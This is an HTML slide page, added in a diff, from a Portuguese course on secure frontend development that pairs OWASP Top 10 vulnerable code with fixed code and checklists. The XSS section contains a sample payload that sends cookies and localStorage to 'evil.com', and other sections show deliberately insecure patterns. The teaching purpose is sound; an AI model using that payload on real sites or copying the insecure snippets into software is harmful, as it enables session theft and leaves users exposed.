@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
+  <title>OWASP no frontend</title>
+</head>
+<body class="min-h-screen bg-slate-950 text-slate-100">
+  <div class="min-h-screen flex flex-col">
+    <header class="sticky top-0 z-10 border-b border-slate-800 bg-slate-900/80 backdrop-blur">
+      <div class="max-w-5xl mx-auto flex items-center justify-between px-4 py-3">
+        <a href="001.html" class="text-sm font-semibold tracking-tight text-slate-100">
+          Desenvolvimento seguro no frontend
+        </a>
+        <nav class="flex items-center gap-3 text-xs sm:text-sm">
+          <a href="009.html" class="px-3 py-1 rounded-full bg-slate-800 hover:bg-slate-700">
+            ◀ Anterior
+          </a>
+          <div class="hidden md:flex items-center gap-1">
+            <a href="001.html" class="px-2 py-1 rounded-full hover:bg-slate-800">01</a>
+            <a href="002.html" class="px-2 py-1 rounded-full hover:bg-slate-800">02</a>
+            <a href="003.html" class="px-2 py-1 rounded-full hover:bg-slate-800">03</a>
+            <a href="004.html" class="px-2 py-1 rounded-full hover:bg-slate-800">04</a>
+            <a href="005.html" class="px-2 py-1 rounded-full hover:bg-slate-800">05</a>
+            <a href="006.html" class="px-2 py-1 rounded-full hover:bg-slate-800">06</a>
+            <a href="007.html" class="px-2 py-1 rounded-full hover:bg-slate-800">07</a>
+            <a href="008.html" class="px-2 py-1 rounded-full hover:bg-slate-800">08</a>
+            <a href="009.html" class="px-2 py-1 rounded-full hover:bg-slate-800">09</a>
+            <a href="010.html" class="px-2 py-1 rounded-full bg-sky-500 text-slate-950 font-semibold">10</a>
+            <a href="011.html" class="px-2 py-1 rounded-full hover:bg-slate-800">11</a>
+          </div>
+          <a href="011.html" class="px-3 py-1 rounded-full bg-sky-500 text-slate-950 font-semibold hover:bg-sky-400">
+            Próximo ▶
+          </a>
+        </nav>
+      </div>
+    </header>
+
+    <main class="flex-1">
+      <section class="max-w-5xl mx-auto px-4 py-10 space-y-8">
+        <header class="space-y-3">
+          <h1 class="text-3xl sm:text-4xl font-bold tracking-tight">
+            OWASP visto do frontend
+          </h1>
+          <p class="text-slate-300 text-sm sm:text-base">
+            Alguns itens mapeados pra problemas que o front enxerga.
+          </p>
+        </header>
+
+        <section class="space-y-4">
+          <div id="owasp-demo" class="rounded-2xl border border-slate-800 bg-slate-900/60 p-5 text-sm sm:text-base"></div>
+          <div class="flex flex-wrap gap-3">
+            <button onclick="mostrarOWASPCategoria('A01')"
+                    class="inline-flex items-center gap-2 rounded-full bg-slate-700 px-4 py-2 text-xs sm:text-sm font-semibold text-slate-100 shadow-sm hover:bg-slate-600 cursor-pointer">
+              A01 - Access Control
+            </button>
+            <button onclick="mostrarOWASPCategoria('A03')"
+                    class="inline-flex items-center gap-2 rounded-full bg-slate-700 px-4 py-2 text-xs sm:text-sm font-semibold text-slate-100 shadow-sm hover:bg-slate-600 cursor-pointer">
+              A03 - Injection/XSS
+            </button>
+            <button onclick="mostrarOWASPCategoria('A05')"
+                    class="inline-flex items-center gap-2 rounded-full bg-slate-700 px-4 py-2 text-xs sm:text-sm font-semibold text-slate-100 shadow-sm hover:bg-slate-600 cursor-pointer">
+              A05 - Misconfiguration
+            </button>
+            <button onclick="mostrarOWASPCategoria('A06')"
+                    class="inline-flex items-center gap-2 rounded-full bg-slate-700 px-4 py-2 text-xs sm:text-sm font-semibold text-slate-100 shadow-sm hover:bg-slate-600 cursor-pointer">
+              A06 - Vulnerable Components
+            </button>
+            <button onclick="mostrarOWASPCategoria('A07')"
+                    class="inline-flex items-center gap-2 rounded-full bg-slate-700 px-4 py-2 text-xs sm:text-sm font-semibold text-slate-100 shadow-sm hover:bg-slate-600 cursor-pointer">
+              A07 - Auth Failures
+            </button>
+          </div>
+        </section>
+      </section>
+    </main>
+
+    <footer class="border-t border-slate-800 py-3 text-center text-xs text-slate-500">
+      Desenvolvimento seguro no frontend — Vinicios Neves
+    </footer>
+  </div>
+  
+  <script>
+    function mostrarOWASPCategoria(categoria) {
+      const demo = document.getElementById('owasp-demo');
+      
+      const categorias = {
+        'A01': {
+          title: 'A01 - Broken Access Control',
+          description: '"Se eu esconder o botão no front, tá resolvido" (não tá).',
+          color: '#ff6b6b',
+          exemplo: `
+// 🚨 PROBLEMA (Frontend)
+function AdminButton() {
+  const user = useUser();
+  
+  // Escondendo botão não é segurança!
+  if (!user.isAdmin) return null;
+  
+  return (
+    &lt;button onClick={() => deleteUser(userId)}&gt;
+      Deletar Usuário
+    &lt;/button&gt;
+  );
+}
+
+// Mas a API está exposta:
+fetch('/api/users/123', { method: 'DELETE' })
+  .then(() => console.log('Deletado! 😈'));`,
+          solucao: `
+// ✅ SOLUÇÃO (Backend - Node.js)
+app.delete('/api/users/:id', requireAuth, (req, res) => {
+  // ✅ Validação de autorização no servidor
+  if (!req.user.roles.includes('admin')) {
+    return res.status(403).json({ 
+      error: 'Forbidden: Admin access required' 
+    });
+  }
+  
+  // ✅ Validação de propriedade do recurso
+  const targetUser = db.getUserById(req.params.id);
+  if (targetUser.id === req.user.id) {
+    return res.status(403).json({ 
+      error: 'Cannot delete yourself' 
+    });
+  }
+  
+  db.deleteUser(req.params.id);
+  res.json({ success: true });
+});`,
+          checklist: [
+            'Validar TODAS as requisições no backend',
+            'Verificar role/permissions no servidor',
+            'Não confiar em flags do frontend',
+            'Implementar RBAC (Role-Based Access Control)',
+            'Logs de acesso para auditoria'
+          ]
+        },
+        'A03': {
+          title: 'A03 - Injection (inclui XSS)',
+          description: 'Inputs sem sanitização, HTML vindo do backend.',
+          color: '#f39c12',
+          exemplo: `
+// 🚨 PROBLEMA - XSS via dangerouslySetInnerHTML
+function UserComment({ comment }) {
+  return (
+    &lt;div dangerouslySetInnerHTML={{ 
+      __html: comment.html  // 💀 Malicioso!
+    }} /&gt;
+  );
+}
+
+// Comentário malicioso do banco:
+const comment = {
+  html: '&lt;img src=x onerror="
+    fetch(\'https://evil.com/steal\', {
+      method: \'POST\',
+      body: JSON.stringify({
+        cookies: document.cookie,
+        localStorage: {...localStorage}
+      })
+    })
+  "/&gt;'
+};`,
+          solucao: `
+// ✅ SOLUÇÃO 1: Usar texto puro
+function UserComment({ comment }) {
+  return &lt;p&gt;{comment.text}&lt;/p&gt;; // Escapa automaticamente
+}
+
+// ✅ SOLUÇÃO 2: Sanitizar com DOMPurify
+import DOMPurify from 'dompurify';
+
+function UserCommentHtml({ comment }) {
+  const safeHtml = DOMPurify.sanitize(comment.html, {
+    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p'],
+    ALLOWED_ATTR: []
+  });
+  
+  return &lt;div dangerouslySetInnerHTML={{ __html: safeHtml }} /&gt;
+}
+
+// ✅ Backend também deve validar
+app.post('/api/comments', (req, res) => {
+  const sanitized = sanitizeHtml(req.body.comment, {
+    allowedTags: ['b', 'i', 'em', 'strong'],
+    allowedAttributes: {}
+  });
+  
+  db.saveComment(sanitized);
+});`,
+          checklist: [
+            'NUNCA confie em input do usuário',
+            'Use textContent ou {variavel} em React',
+            'Sanitize com DOMPurify se precisar HTML',
+            'Configure CSP (Content Security Policy)',
+            'Escape no backend também'
+          ]
+        },
+        'A05': {
+          title: 'A05 - Security Misconfiguration',
+          description: 'CORS liberado demais, headers de segurança faltando.',
+          color: '#e74c3c',
+          exemplo: `
+// 🚨 PROBLEMA - CORS totalmente aberto
+app.use(cors({
+  origin: '*',  // 💀 Qualquer site pode chamar sua API!
+  credentials: true
+}));
+
+// Headers de segurança faltando
+// Sem HTTPS force
+// Sem rate limiting
+// Secrets no código frontend`,
+          solucao: `
+// ✅ SOLUÇÃO - Configuração segura (Express)
+const helmet = require('helmet');
+const rateLimit = require('express-rate-limit');
+
+// Security headers
+app.use(helmet({
+  contentSecurityPolicy: {
+    directives: {
+      defaultSrc: ["'self'"],
+      scriptSrc: ["'self'", "'unsafe-inline'"],
+      styleSrc: ["'self'", "'unsafe-inline'"],
+      imgSrc: ["'self'", "data:", "https:"],
+    },
+  },
+  hsts: {
+    maxAge: 31536000,
+    includeSubDomains: true,
+    preload: true
+  }
+}));
+
+// CORS restrito
+app.use(cors({
+  origin: ['https://meuapp.com'],
+  credentials: true,
+  methods: ['GET', 'POST', 'PUT', 'DELETE'],
+  allowedHeaders: ['Content-Type', 'Authorization']
+}));
+
+// Rate limiting
+const limiter = rateLimit({
+  windowMs: 15 * 60 * 1000, // 15 minutos
+  max: 100 // máximo 100 requests por IP
+});
+app.use('/api/', limiter);
+
+// Force HTTPS
+app.use((req, res, next) => {
+  if (!req.secure && process.env.NODE_ENV === 'production') {
+    return res.redirect('https://' + req.headers.host + req.url);
+  }
+  next();
+});`,
+          checklist: [
+            'Use helmet.js para security headers',
+            'Configure CORS específico (não *)',
+            'Implemente rate limiting',
+            'Force HTTPS em produção',
+            'Configure CSP adequado',
+            'Desabilite X-Powered-By',
+            'Use variáveis de ambiente para configs'
+          ]
+        },
+        'A06': {
+          title: 'A06 - Vulnerable and Outdated Components',
+          description: 'Libs desatualizadas, pacotes sem manutenção.',
+          color: '#9b59b6',
+          exemplo: `
+// 🚨 PROBLEMA - package.json desatualizado
+{
+  "dependencies": {
+    "react": "16.8.0",      // 💀 Versão de 2019!
+    "lodash": "4.17.15",    // 💀 Vulnerabilidades conhecidas
+    "axios": "0.18.0",      // 💀 MUITO desatualizado
+    "moment": "2.24.0"      // 💀 Deprecated!
+  }
+}
+
+// npm audit mostra:
+// 45 vulnerabilities (12 moderate, 25 high, 8 critical)`,
+          solucao: `
+// ✅ SOLUÇÃO - Manter dependências atualizadas
+
+// 1. Auditar regularmente
+$ npm audit
+$ npm audit fix
+$ npm outdated
+
+// 2. Atualizar com cuidado
+$ npm update
+$ npm install package@latest
+
+// 3. package.json atualizado
+{
+  "dependencies": {
+    "react": "^18.2.0",     // ✅ Atual
+    "lodash": "^4.17.21",   // ✅ Patched
+    "axios": "^1.6.0",      // ✅ Atual
+    "date-fns": "^2.30.0"   // ✅ Alternativa ao moment
+  },
+  "scripts": {
+    "audit": "npm audit",
+    "check-updates": "npx npm-check-updates"
+  }
+}
+
+// 4. Automação com GitHub Actions
+name: Security Audit
+on: [push, pull_request, schedule]
+jobs:
+  audit:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - run: npm audit --audit-level=moderate`,
+          checklist: [
+            'Rode npm audit semanalmente',
+            'Configure Dependabot no GitHub',
+            'Revise updates de dependências',
+            'Remova dependências não usadas',
+            'Prefira libs bem mantidas',
+            'Check npm.devtool.tech/package-health',
+            'Audit em CI/CD pipeline'
+          ]
+        },
+        'A07': {
+          title: 'A07 - Identification and Authentication Failures',
+          description: 'Fluxo de login frágil, tokens mal armazenados.',
+          color: '#e67e22',
+          exemplo: `
+// 🚨 PROBLEMAS comuns
+
+// 1. Token no localStorage (vulnerável a XSS)
+localStorage.setItem('token', jwt);
+
+// 2. Senha sem hash
+app.post('/register', (req, res) => {
+  db.createUser({
+    email: req.body.email,
+    password: req.body.password  // 💀 Plain text!
+  });
+});
+
+// 3. Session sem expiração
+const session = { userId: 123 };  // 💀 Vive pra sempre
+
+// 4. Sem rate limit no login
+app.post('/login', loginHandler);  // 💀 Brute force!
+
+// 5. Sem MFA, sem verificação de email`,
+          solucao: `
+// ✅ SOLUÇÕES
+
+// 1. Token em HttpOnly Cookie
+app.post('/login', async (req, res) => {
+  const user = await authenticateUser(req.body);
+  const token = generateJWT(user);
+  
+  res.cookie('accessToken', token, {
+    httpOnly: true,      // ✅ JS não acessa
+    secure: true,        // ✅ Apenas HTTPS
+    sameSite: 'strict',  // ✅ CSRF protection
+    maxAge: 15 * 60 * 1000  // ✅ 15 minutos
+  });
+  
+  res.json({ success: true });
+});
+
+// 2. Hash de senha com bcrypt
+const bcrypt = require('bcrypt');
+
+app.post('/register', async (req, res) => {
+  const hashedPassword = await bcrypt.hash(
+    req.body.password, 
+    10  // salt rounds
+  );
+  
+  await db.createUser({
+    email: req.body.email,
+    password: hashedPassword  // ✅ Hashed!
+  });
+});
+
+// 3. JWT com expiração
+const jwt = require('jsonwebtoken');
+
+const token = jwt.sign(
+  { userId: user.id }, 
+  process.env.JWT_SECRET,
+  { 
+    expiresIn: '15m',  // ✅ Expira
+    issuer: 'meuapp.com',
+    audience: 'meuapp.com'
+  }
+);
+
+// 4. Rate limiting no login
+const loginLimiter = rateLimit({
+  windowMs: 15 * 60 * 1000,
+  max: 5,  // ✅ 5 tentativas apenas
+  message: 'Muitas tentativas de login'
+});
+
+app.post('/login', loginLimiter, loginHandler);
+
+// 5. MFA com TOTP
+const speakeasy = require('speakeasy');
+
+// Verificar código MFA
+const verified = speakeasy.totp.verify({
+  secret: user.mfaSecret,
+  encoding: 'base32',
+  token: req.body.mfaCode,
+  window: 2
+});`,
+          checklist: [
+            'Use HttpOnly cookies para tokens',
+            'Hash senhas com bcrypt (min 10 rounds)',
+            'Implemente expiração de sessão',
+            'Rate limit em login/register',
+            'Require senha forte (min 8 chars)',
+            'Implemente MFA (TOTP)',
+            'Verificação de email obrigatória',
+            'Password reset seguro (tokens únicos)',
+            'Log de tentativas de login',
+            'Bloqueio após X tentativas falhas'
+          ]
+        }
+      };
+      
+      const cat = categorias[categoria];
+      
+      demo.innerHTML = `
+        <div style="background: #1a1a1a; color: white; padding: 25px; border-radius: 10px; border: 3px solid ${cat.color};">
+          <h2 style="color: ${cat.color}; margin-top: 0;">${cat.title}</h2>
+          <p style="font-size: 1.1em; color: #ccc;">${cat.description}</p>
+          
+          <div style="background: #2d2d2d; padding: 20px; border-radius: 5px; margin: 20px 0;">
+            <h3 style="color: #ff6b6b;">🚨 Exemplo de código vulnerável:</h3>
+            <pre style="background: black; padding: 15px; overflow-x: auto; color: #0f0; border-radius: 5px;">${cat.exemplo}</pre>
+          </div>
+          
+          <div style="background: #155724; padding: 20px; border-radius: 5px; margin: 20px 0;">
+            <h3 style="color: #6fbf73;">✅ Código seguro:</h3>
+            <pre style="background: black; padding: 15px; overflow-x: auto; color: #0f0; border-radius: 5px;">${cat.solucao}</pre>
+          </div>
+          
+          <div style="background: #2d2d2d; padding: 20px; border-radius: 5px;">
+            <h3 style="color: ${cat.color};">📋 Checklist:</h3>
+            <ul style="color: white; line-height: 1.8;">
+              ${cat.checklist.map(item => `<li>✓ ${item}</li>`).join('')}
+            </ul>
+          </div>
+        </div>
+      `;
+    }
+    
+    // Estado inicial
+    document.getElementById('owasp-demo').innerHTML = `
+      <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px;">
+        <h2 style="margin-top: 0; font-size: 1.8em;">OWASP Top 10 - Guia Prático Frontend</h2>
+        <p style="font-size: 1.1em;">Use o OWASP como checklist de conversa com o backend, não apenas teoria.</p>
+        <div style="background: rgba(255,255,255,0.15); padding: 20px; border-radius: 8px; margin-top: 20px;">
+          <p style="font-size: 1.05em;"><strong>💡 Clique nos botões acima para explorar cada categoria:</strong></p>
+          <ul style="columns: 2; column-gap: 30px; margin-top: 15px; line-height: 1.8;">
+            <li><strong>A01</strong> - Broken Access Control</li>
+            <li><strong>A03</strong> - Injection (XSS)</li>
+            <li><strong>A05</strong> - Security Misconfiguration</li>
+            <li><strong>A06</strong> - Vulnerable Components</li>
+            <li><strong>A07</strong> - Authentication Failures</li>
+          </ul>
+        </div>
+        <p style="margin-top: 20px; font-size: 1em; opacity: 0.95; background: rgba(0,0,0,0.2); padding: 15px; border-radius: 5px;">
+          ✨ Cada categoria apresenta: <strong>código vulnerável → código seguro → checklist prático</strong>
+        </p>
+      </div>
+    `;
+  </script>
+
+  <p>Ideia: usar OWASP como checklist de conversa com o backend, não só teoria.</p>
+</body>
+</html>
